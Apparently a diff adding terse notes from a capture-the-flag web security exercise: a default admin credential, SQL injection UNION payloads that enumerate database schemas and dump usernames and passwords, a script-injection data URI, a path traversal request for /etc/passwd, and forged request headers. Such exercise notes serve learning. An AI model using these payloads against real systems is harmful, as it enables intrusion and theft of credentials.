@@ -1,0 +1,25 @@
+Survey: Modif Select
+
+Admin: root:dragon
+
+Search Images: Follow instructions
+# 1 and 1 = 0 UNION select table_name, column_name FROM information_schema.columns 
+# 1 and 1 = 0 UNION select url, comment from list_images
+
+Search member:
+# 1 and 1 = 0 UNION select table_name, column_name FROM information_schema.columns 
+# 1 and 1 = 0 union select Commentaire, countersign from users
+
+Login:
+In member
+# 1 and 1 = 0 UNION SELECT null, schema_name FROM information_schema.schemata
+# 1 and 1 = 0 union select username, password from Member_Brute_Force.db_default
+
+NSA Home:
+data;text/html;base64,(base64 <script></script>)
+
+Path Traversal: http://172.16.197.128/index.php?page=../../../../../../../etc/passwd
+
+Header:
+Referer - https://www.nsa.gov/ 
+User-Agent - ft_bornToSec
